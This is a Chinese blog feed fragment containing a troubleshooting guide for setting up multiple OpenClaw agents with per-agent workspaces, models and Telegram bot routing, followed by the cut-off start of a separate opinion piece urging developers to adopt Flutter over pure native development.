<p>本文不是理论教程，而是实战踩坑记录。我会告诉你配置过程中会遇到哪些坑，为什么会踩坑，以及怎么避免和解决。</p>
<h2 data-id="heading-0">为什么需要多 Agent</h2>
<p><strong>场景隔离</strong>。不同的工作场景需要不同的 AI 助手：</p>
<ul>
<li><strong>博客助手</strong>：专注于技术写作，熟悉你的博客部署流程，有独立的文章草稿目录</li>
<li><strong>小说助手</strong>：创意写作风格，管理小说章节和人物设定，不需要访问技术代码</li>
<li><strong>开发助手</strong>：熟悉代码规范，可以执行敏感命令，但不应该访问私人笔记</li>
<li><strong>家庭助手</strong>：绑定到家庭 WhatsApp 群，只能访问受限的工具集，保护隐私</li>
</ul>
<p><strong>独立配置</strong>。每个 Agent 有自己的：</p>
<ul>
<li><strong>Workspace</strong>：独立的工作目录，互不干扰</li>
<li><strong>SOUL.md</strong>：独立的角色定位和性格设定</li>
<li><strong>Model</strong>：可以给不同 Agent 配置不同模型（Opus 做深度思考，Sonnet 做日常聊天）</li>
<li><strong>Tool Policy</strong>：限制某些 Agent 的工具权限（比如家庭助手不能执行 shell 命令）</li>
</ul>
<p><strong>账号路由</strong>。多个 Telegram bot 或 WhatsApp 账号，路由到不同的 Agent，一个 Gateway 管理所有账号。</p>
<p>举个例子，你可能会配置这样的 Agent：</p>
<ul>
<li><code>main</code>：日常聊天，全功能</li>
<li><code>work</code>：工作场景，可以访问项目文档</li>
<li><code>creative</code>：创作助手，专注于写作</li>
<li><code>coding</code>：开发助手，执行代码相关任务</li>
</ul>
<h2 data-id="heading-1">多 Agent 配置流程</h2>
<h3 data-id="heading-2">1. 创建 Agent</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建一个新 Agent</span>
openclaw agents add blog --workspace ~/.openclaw/workspace-blog

<span class="hljs-comment"># 验证创建结果</span>
openclaw agents list
</code></pre>
<p>这会在配置文件中添加：</p>
<pre><code class="hljs language-json5" lang="json5">{
  agents: {
    list: [
      {
        id: "main",
        default: true,
        workspace: "~/.openclaw/workspace",
      },
      {
        id: "blog",
        workspace: "~/.openclaw/workspace-blog",
      },
    ],
  },
}
</code></pre>
<h3 data-id="heading-3">2. 设置模型</h3>
<p><strong>⚠️ 第一个坑：模型 ID 格式</strong></p>
<p>配置模型时，要用<strong>别名</strong>，不要带日期后缀！</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ✅ 正确：使用别名</span>
openclaw config patch agents.list.1.model <span class="hljs-string">"anthropic/claude-sonnet-4-5"</span>

<span class="hljs-comment"># ❌ 错误：带日期后缀的完整 ID</span>
openclaw config patch agents.list.1.model <span class="hljs-string">"anthropic/claude-sonnet-4-20250514"</span>
</code></pre>
<p><strong>为什么？</strong></p>
<p>带日期的 ID 会在新版本发布时失效。别名（如 <code>claude-sonnet-4-5</code>）会自动指向最新版本。</p>
<p>验证配置：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw config get agents.list.1.model
<span class="hljs-comment"># 应该输出：anthropic/claude-sonnet-4-5</span>
</code></pre>
<h3 data-id="heading-4">3. 编写 SOUL.md 定义角色</h3>
<p>每个 Agent 的 workspace 下创建 <code>SOUL.md</code>，定义它的角色：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ~/.openclaw/workspace-blog
</code></pre>
<p>创建 <code>SOUL.md</code>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># SOUL.md - 工作助手</span>

你是工作助手，帮助处理日常工作任务。

<span class="hljs-section">## 角色定位</span>
<span class="hljs-bullet">-</span> 专注于工作场景，风格专业高效
<span class="hljs-bullet">-</span> 熟悉常用开发工具和工作流程
<span class="hljs-bullet">-</span> 所有重要操作需要确认后执行

<span class="hljs-section">## 工作流程</span>
<span class="hljs-bullet">1.</span> 接收任务需求
<span class="hljs-bullet">2.</span> 分析任务并制定执行计划
<span class="hljs-bullet">3.</span> 执行任务
<span class="hljs-bullet">4.</span> 汇报结果

<span class="hljs-section">## 工作规范</span>
<span class="hljs-bullet">-</span> 代码示例要完整可用
<span class="hljs-bullet">-</span> 文档结构清晰
<span class="hljs-bullet">-</span> 操作前确认权限
</code></pre>
<p><strong>⚠️ 第二个坑：不要创建 BOOTSTRAP.md</strong></p>
<p>如果你手动创建了 <code>BOOTSTRAP.md</code>，Agent 会一直卡在 bootstrapping 状态！</p>
<p><strong>为什么？</strong></p>
<p><code>BOOTSTRAP.md</code> 是 Agent 的"初始化任务清单"。Agent 启动后会执行里面的指令，执行完才会删除这个文件。如果你手动创建了这个文件但内容不完整，Agent 会不断尝试执行，永远无法进入正常状态。</p>
<p><strong>解决方法：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果发现 Agent 卡住了，检查是否有 BOOTSTRAP.md</span>
<span class="hljs-built_in">ls</span> ~/.openclaw/workspace-blog/BOOTSTRAP.md

<span class="hljs-comment"># 如果存在，直接删除</span>
<span class="hljs-built_in">rm</span> ~/.openclaw/workspace-blog/BOOTSTRAP.md

<span class="hljs-comment"># 重启 Gateway</span>
openclaw gateway restart
</code></pre>
<h3 data-id="heading-5">4. 测试 Agent</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 列出所有 Agent</span>
openclaw agents list

<span class="hljs-comment"># 查看 Agent 详细配置</span>
openclaw config get agents.list.1

<span class="hljs-comment"># 重启 Gateway 让配置生效</span>
openclaw gateway restart
</code></pre>
<h2 data-id="heading-6">Telegram 多账号配置</h2>
<p>多 Agent 的典型用法是配置多个 Telegram bot，每个 bot 路由到不同的 Agent。</p>
<h3 data-id="heading-7">1. 创建 Telegram Bot</h3>
<p>在 Telegram 找 <a href="https://link.juejin.cn?target=https%3A%2F%2Ft.me%2FBotFather" target="_blank" title="https://t.me/BotFather" ref="nofollow noopener noreferrer">@BotFather</a>，创建 bot：</p>
<pre><code class="hljs language-bash" lang="bash">/newbot
</code></pre>
<p>按提示输入名称和用户名，获得 token（类似 <code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>）。</p>
<p>假设你创建了两个 bot：</p>
<ul>
<li><code>@MyMainBot</code> → token1</li>
<li><code>@MyWorkBot</code> → token2</li>
</ul>
<h3 data-id="heading-8">2. 配置多账号</h3>
<p>编辑 <code>~/.openclaw/openclaw.json</code>（或用 <code>openclaw config patch</code>）：</p>
<pre><code class="hljs language-json5" lang="json5">{
  channels: {
    telegram: {
      accounts: {
        main: {
          token: "token1",
          dmPolicy: "allowlist",
          allowFrom: ["123456789"], // 你的 Telegram user ID
        },
        blog: {
          token: "token2",
          dmPolicy: "allowlist",
          allowFrom: ["123456789"],
        },
      },
    },
  },
}
</code></pre>
<p><strong>⚠️ 第三个坑：dmPolicy 默认值</strong></p>
<p>如果不设置 <code>dmPolicy</code>，默认是 <code>pairing</code>，这意味着用户必须先执行 <code>/pair</code> 命令才能聊天。但如果配置有问题，<code>/pair</code> 可能也不会响应，消息会被<strong>静默丢弃</strong>！</p>
<p><strong>解决方法：</strong></p>
<p>明确设置 <code>dmPolicy: "allowlist"</code>，并配置 <code>allowFrom</code> 列表：</p>
<pre><code class="hljs language-json5" lang="json5">{
  dmPolicy: "allowlist",
  allowFrom: ["123456789", "987654321"], // 允许的 user ID 列表
}
</code></pre>
<p>获取你的 Telegram user ID：给 <a href="https://link.juejin.cn?target=https%3A%2F%2Ft.me%2Fuserinfobot" target="_blank" title="https://t.me/userinfobot" ref="nofollow noopener noreferrer">@userinfobot</a> 发消息。</p>
<h3 data-id="heading-9">3. 配置路由规则</h3>
<p>添加 <code>bindings</code> 将不同的 Telegram 账号路由到不同的 Agent：</p>
<pre><code class="hljs language-json5" lang="json5">{
  bindings: [
    {
      agentId: "main",
      match: { channel: "telegram", accountId: "main" },
    },
    {
      agentId: "blog",
      match: { channel: "telegram", accountId: "blog" },
    },
  ],
}
</code></pre>
<p><strong>路由规则优先级</strong>：</p>
<ol>
<li><code>peer</code> 精确匹配（具体的 DM 或群组 ID）</li>
<li><code>accountId</code> 匹配（哪个 Telegram 账号）</li>
<li><code>channel</code> 匹配（哪个平台）</li>
<li>默认 Agent（<code>default: true</code> 或列表中第一个）</li>
</ol>
<h3 data-id="heading-10">4. 重启 Gateway</h3>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway restart --reason <span class="hljs-string">"添加新 Telegram bot"</span>
</code></pre>
<p>测试：给两个 bot 发 <code>/start</code>，应该分别收到来自不同 Agent 的回复。</p>
<h2 data-id="heading-11">常见问题与解决</h2>
<h3 data-id="heading-12">问题 1：config.patch 把配置冲掉了</h3>
<p><strong>现象：</strong></p>
<p>我想给 <code>telegram.accounts</code> 添加一个新账号，执行：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw config patch channels.telegram.accounts.blog <span class="hljs-string">'{"token":"xxx"}'</span>
</code></pre>
<p>结果其他账号的配置全没了！</p>
<p><strong>原因：</strong></p>
<p><code>config.patch</code> 对<strong>嵌套对象</strong>是<strong>整体替换</strong>，不是增量修改！</p>
<p>如果配置是：</p>
<pre><code class="hljs language-json5" lang="json5">{
  channels: {
    telegram: {
      accounts: {
        main: {...},
        novel: {...},
      },
    },
  },
}
</code></pre>
<p>执行 <code>patch channels.telegram.accounts.blog {...}</code> 会导致：</p>
<pre><code class="hljs language-json5" lang="json5">{
  channels: {
    telegram: {
      accounts: {
        blog: {...}, // 只剩这一个！
      },
    },
  },
}
</code></pre>
<p><strong>解决方法：</strong></p>
<p>patch 时带上<strong>完整的对象</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ❌ 错误：只 patch 一个子项</span>
openclaw config patch channels.telegram.accounts.blog <span class="hljs-string">'{"token":"xxx"}'</span>

<span class="hljs-comment"># ✅ 正确：patch 整个 accounts 对象</span>
openclaw config patch channels.telegram.accounts <span class="hljs-string">'{
  "main": {"token":"token1", "dmPolicy":"allowlist", "allowFrom":["123456789"]},
  "blog": {"token":"token2", "dmPolicy":"allowlist", "allowFrom":["123456789"]}
}'</span>
</code></pre>
<p>同样适用于 <code>bindings</code>、<code>agents.list</code> 等数组或对象。</p>
<p><strong>最佳实践：</strong></p>
<p>配置变更前，先导出当前配置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 导出当前配置</span>
openclaw config get channels.telegram.accounts &gt; telegram-accounts-backup.json

<span class="hljs-comment"># 编辑后再 patch 回去</span>
openclaw config patch channels.telegram.accounts <span class="hljs-string">"<span class="hljs-subst">$(cat telegram-accounts-edited.json)</span>"</span>
</code></pre>
<h3 data-id="heading-13">问题 2：Telegram bot 不响应消息</h3>
<p><strong>现象：</strong></p>
<p>给 bot 发 <code>/start</code> 或任何消息，都没有回复。</p>
<p><strong>可能的原因 1：dmPolicy 配置问题</strong></p>
<p>检查配置：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw config get channels.telegram.accounts.blog.dmPolicy
</code></pre>
<p>如果是 <code>pairing</code> 或未设置，改成 <code>allowlist</code>：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw config patch channels.telegram.accounts.blog.dmPolicy <span class="hljs-string">'"allowlist"'</span>
openclaw config patch channels.telegram.accounts.blog.allowFrom <span class="hljs-string">'["123456789"]'</span>
openclaw gateway restart
</code></pre>
<p><strong>可能的原因 2：Telegram 409 冲突</strong></p>
<p><strong>症状：</strong> 日志中有 <code>getUpdates conflict (409)</code> 错误。</p>
<p><strong>原因：</strong> 同一个 bot token 被多个实例同时使用！常见场景：</p>
<ul>
<li>OpenClaw.app (GUI) 和 CLI gateway 同时运行</li>
<li>两个 terminal 同时启动了 gateway</li>
</ul>
<p><strong>检查：</strong></p>
<pre><code class="hljs language-bash" lang="bash">ps aux | grep -i openclaw
</code></pre>
<p>如果看到多个进程（GUI app 和 CLI gateway），说明冲突了。</p>
<p><strong>解决方法：</strong></p>
<ol>
<li>退出 OpenClaw.app (GUI)</li>
<li>重启 CLI gateway：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway restart --reason <span class="hljs-string">"清除 Telegram bot 冲突"</span>
</code></pre>
<p><strong>教训：</strong></p>
<p>同一个 Telegram bot token <strong>只能被一个 Gateway 实例使用</strong>。如果要切换 GUI/CLI，必须先停掉其中一个。</p>
<h3 data-id="heading-14">问题 3：绑定规则不生效</h3>
<p><strong>现象：</strong></p>
<p>配置了 <code>bindings</code>，但消息还是路由到了错误的 Agent。</p>
<p><strong>检查绑定：</strong></p>
<pre><code class="hljs language-bash" lang="bash">openclaw agents list --bindings
</code></pre>
<p><strong>常见错误：</strong></p>
<ol>
<li><strong>顺序错误</strong>：更具体的规则要放在前面</li>
</ol>
<pre><code class="hljs language-json5" lang="json5">// ❌ 错误：通配规则在前，精确规则在后
bindings: [
  { agentId: "main", match: { channel: "telegram" } }, // 会匹配所有 telegram 消息
  { agentId: "blog", match: { channel: "telegram", accountId: "blog" } }, // 永远不会执行
]

// ✅ 正确：精确规则在前
bindings: [
  { agentId: "blog", match: { channel: "telegram", accountId: "blog" } },
  { agentId: "main", match: { channel: "telegram", accountId: "main" } },
]
</code></pre>
<ol start="2">
<li><strong>accountId 拼写错误</strong>：检查是否与 <code>channels.telegram.accounts</code> 中的 key 一致</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 列出所有配置的账号</span>
openclaw config get channels.telegram.accounts | jq <span class="hljs-string">'keys'</span>
</code></pre>
<h3 data-id="heading-15">问题 4：Agent 配置变更后不生效</h3>
<p><strong>解决方法：</strong></p>
<p>Gateway 需要重启才能加载新配置：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway restart --reason <span class="hljs-string">"更新 Agent 配置"</span>
</code></pre>
<p>检查 Agent 是否正常启动：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw status --deep
</code></pre>
<p>如果看到某个 Agent 状态异常，查看日志：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">tail</span> -n 100 ~/.openclaw/gateway.err.log
</code></pre>
<h3 data-id="heading-16">问题 5：配置了嵌套对象，但只有部分生效</h3>
<p><strong>现象：</strong></p>
<p>我在顶层配置了 <code>channels.telegram.dmPolicy</code>，为什么某个账号还是用了不同的策略？</p>
<p><strong>原因：</strong></p>
<p>配置有<strong>继承关系</strong>，account 级别的配置会<strong>覆盖</strong>顶层配置：</p>
<pre><code class="hljs language-json5" lang="json5">{
  channels: {
    telegram: {
      dmPolicy: "allowlist", // 顶层默认
      allowFrom: ["123456789"],
      accounts: {
        main: {
          token: "token1",
          // 继承顶层的 dmPolicy 和 allowFrom
        },
        public: {
          token: "token2",
          dmPolicy: "pairing", // 覆盖顶层配置
        },
      },
    },
  },
}
</code></pre>
<p><strong>最佳实践：</strong></p>
<ul>
<li>如果所有账号都用相同策略，配置在顶层</li>
<li>如果某个账号需要不同策略，在 account 级别覆盖</li>
<li>明确写出每个 account 的 <code>dmPolicy</code>，避免继承混淆</li>
</ul>
<h2 data-id="heading-17">最佳实践</h2>
<h3 data-id="heading-18">1. 配置变更前先审查</h3>
<p><strong>教训：</strong> 我曾因为没仔细审查 patch 命令，把所有 Telegram 账号配置冲掉，导致所有 bot 连接中断。</p>
<p><strong>规则：</strong></p>
<ul>
<li>任何 <code>config.patch</code>、<code>gateway restart</code>、模型变更等操作，<strong>先审查一遍</strong></li>
<li>嵌套对象（<code>bindings</code>、<code>accounts</code>）必须带完整列表</li>
<li>有疑问先导出当前配置对比</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 变更前备份</span>
openclaw config get &gt; openclaw-config-backup.json

<span class="hljs-comment"># 变更后对比</span>
openclaw config get &gt; openclaw-config-new.json
diff openclaw-config-backup.json openclaw-config-new.json
</code></pre>
<h3 data-id="heading-19">2. 使用 status --deep 诊断</h3>
<pre><code class="hljs language-bash" lang="bash">openclaw status --deep
</code></pre>
<p>输出包括：</p>
<ul>
<li>每个 Agent 的状态</li>
<li>Channel 连接状态</li>
<li>最近的错误日志</li>
</ul>
<p>如果某个 Agent 或 Channel 异常，会直接显示。</p>
<h3 data-id="heading-20">3. 查看错误日志</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 实时查看日志</span>
<span class="hljs-built_in">tail</span> -f ~/.openclaw/gateway.err.log

<span class="hljs-comment"># 搜索特定错误</span>
grep -i <span class="hljs-string">"error\|conflict\|fail"</span> ~/.openclaw/gateway.err.log | <span class="hljs-built_in">tail</span> -n 50
</code></pre>
<p>常见错误关键词：</p>
<ul>
<li><code>409 conflict</code>：Telegram bot 冲突</li>
<li><code>unauthorized</code>：token 错误或过期</li>
<li><code>dmPolicy</code>：消息被访问控制策略拦截</li>
<li><code>binding</code>：路由规则问题</li>
</ul>
<h3 data-id="heading-21">4. 分阶段配置</h3>
<p>不要一次性配置所有 Agent 和 Channel，容易出错且难以排查。</p>
<p><strong>推荐流程：</strong></p>
<ol>
<li>先配置一个新 Agent（不配置 Telegram），本地测试</li>
<li>Agent 正常后，添加一个 Telegram bot，测试路由</li>
<li>验证通过后，再添加其他 Agent 和 bot</li>
<li>每次变更后，验证所有已有功能正常</li>
</ol>
<h3 data-id="heading-22">5. 文档化你的配置</h3>
<p>在 workspace 下创建 <code>SETUP.md</code>，记录：</p>
<ul>
<li>每个 Agent 的用途和配置</li>
<li>Telegram bot 对应关系</li>
<li>特殊配置的原因</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># SETUP.md</span>

<span class="hljs-section">## Agents</span>
<span class="hljs-bullet">-</span> main: 日常聊天，全功能，Telegram @MyMainBot
<span class="hljs-bullet">-</span> blog: 技术写作，workspace-blog，Telegram @MyWorkBot
<span class="hljs-bullet">-</span> novel: 小说创作，workspace-novel，仅本地使用

<span class="hljs-section">## Telegram Bots</span>
<span class="hljs-bullet">-</span> @MyMainBot (123456789): main agent
<span class="hljs-bullet">-</span> @MyWorkBot (987654321): work agent

<span class="hljs-section">## 特殊配置</span>
<span class="hljs-bullet">-</span> work agent 的 dmPolicy 设为 allowlist，只允许授权用户访问
<span class="hljs-bullet">-</span> main agent 启用了 heartbeat，定期检查日程
</code></pre>
<h2 data-id="heading-23">总结</h2>
<p>OpenClaw 多 Agent 配置不复杂，但有几个容易踩的坑：</p>
<ol>
<li><strong>config.patch 陷阱</strong>：嵌套对象是整体替换，不是增量修改</li>
<li><strong>模型 ID</strong>：用别名（<code>claude-sonnet-4-5</code>），不要带日期</li>
<li><strong>BOOTSTRAP.md</strong>：不要手动创建，会导致 Agent 卡住</li>
<li><strong>dmPolicy</strong>：默认是 <code>pairing</code>，建议改成 <code>allowlist</code></li>
<li><strong>Telegram 409</strong>：同一个 bot token 只能被一个 Gateway 使用</li>
<li><strong>配置继承</strong>：account 级别配置会覆盖顶层配置</li>
</ol>
<p><strong>核心原则：</strong></p>
<ul>
<li>配置前先备份</li>
<li>变更后先验证</li>
<li>出问题先看日志</li>
<li>分阶段逐步配置</li>
</ul>
<p>希望这篇文章能帮你少走弯路。如果还有其他问题，欢迎在评论区讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026年了，为什么我建议你放弃“纯原生”开发？]]></title>    <link>https://juejin.cn/post/7605769126272139310</link>    <guid>https://juejin.cn/post/7605769126272139310</guid>    <pubDate>2026-02-13T03:07:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126272139310" data-draft-id="7605907495769227273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026年了，为什么我建议你放弃“纯原生”开发？"/> <meta itemprop="keywords" content="Flutter,客户端"/> <meta itemprop="datePublished" content="2026-02-13T03:07:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员老刘"/> <meta itemprop="url" content="https://juejin.cn/user/662360127965769"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026年了，为什么我建议你放弃“纯原生”开发？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/662360127965769/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员老刘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:07:21.000Z" title="Fri Feb 13 2026 03:07:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>大家好，我是老刘</strong></p>
<p>昨天有个老朋友找我喝酒，哭丧着脸。</p>
<p>这哥们是个五年的Android开发，技术那是没得说。</p>
<p>能独立完成复杂的系统模块，优化过千万级日活的App。</p>
<p>最近去面试一家大厂挂了。</p>
<p>面试官就问了一句：</p>
<p>“如果让你带队把这个模块迁移到鸿蒙和 iOS，除了重写三遍，你有什么低成本方案？”</p>
<p>他愣住了，他引以为傲的原生深度，在降本增效的大潮面前，就变成了一颗昂贵的螺丝钉。</p>
<p>2026 年，不知道有多少朋友又开始了或者将要开始投简历、面试的过程。</p>
<p>老刘借着这篇文章聊聊原生开发、跨平台开发在AI时代的客户端开发领域的生态位，以及作为开发者，我们该如何优化我们的技能树，以适应这个快速变化的行业。</p>
<hr/>
<h2 data-id="heading-0">原生不是死了，而是下沉了</h2>
<p>别误会，我不是说原生技术要消失。</p>
<p>它只是下沉了，沉成了基础设施，就有点像汇编语言一样。</p>
<p>你看现在的 App 架构是啥样的？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb17713aeae4696b5564608272e05a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556840&amp;x-signature=h%2BAMmisL%2BDCz124o%2F7KBfAMFq4U%3D" alt="Mermaid Diagram" loading="lazy"/></p>
<p>如果你只守着那 10% 的原生胶水层，你的职业道路只会越走越窄。</p>
<p>最后变成公司里那个维护遗留代码的守门人，每天对着一堆陈年老代码叹气。</p>
<p>新人都在用新架构写新业务，你在角落里修改哪些该死的兼容性 Bug。</p>
<hr/>
<h2 data-id="heading-1">Flutter vs 原生</h2>
<p>这里老刘不想讨论技术参数的差异，而是想站在开发者的角度，谈谈聚焦不同的技术栈对我们有什么影响。</p>
<p>很多坚持“纯原生”的兄弟，理由往往只有一个：</p>
<p>“原生体验更好，性能更强，跨平台总觉得有点卡。”</p>
<p>听着挺有道理，但在 2026 年，这更像是一个给自己寻找舒适区的借口。</p>
<p><strong>现在的跨平台技术，早已经不是当年的“缝合怪”了。</strong></p>
<p>以 Flutter 为例， Impeller 引擎的成熟，让它的渲染性能在大多数业务场景下，已经做到了和原生毫无差异的程度。</p>
<p>你还在纠结那个滚动条的阻尼感是不是差了 0.01 秒，老板在纠结为什么隔壁组用一套代码已经上线了三个平台，而你还在为 iOS 的一个布局错位调了一下午。</p>
<p><strong>未来的核心竞争力，是端抽象的能力</strong></p>
<p>当你站在跨平台的角度进行开发，你思考问题的维度就变了：</p>
<ul>
<li>你不再是“那个写 Android 的”，你是“那个能搞定全端交付的”。</li>
<li>你不再关心某个系统的私有 API，你开始关心如何设计一套通用的组件库，让业务逻辑在各个端之间无缝流动。</li>
</ul>
<p>这种“端抽象”的能力，才是跨平台开发者真正的护城河。</p>
<hr/>
<h2 data-id="heading-2">跨平台（Flutter）不是加分项，而是及格线</h2>
<p>以前面试，你会 Flutter是加分项。</p>
<p>现在那是及格线。</p>
<p>看看现在的终端环境，乱成一锅粥了：Android、iOS、鸿蒙、web、桌面端...</p>
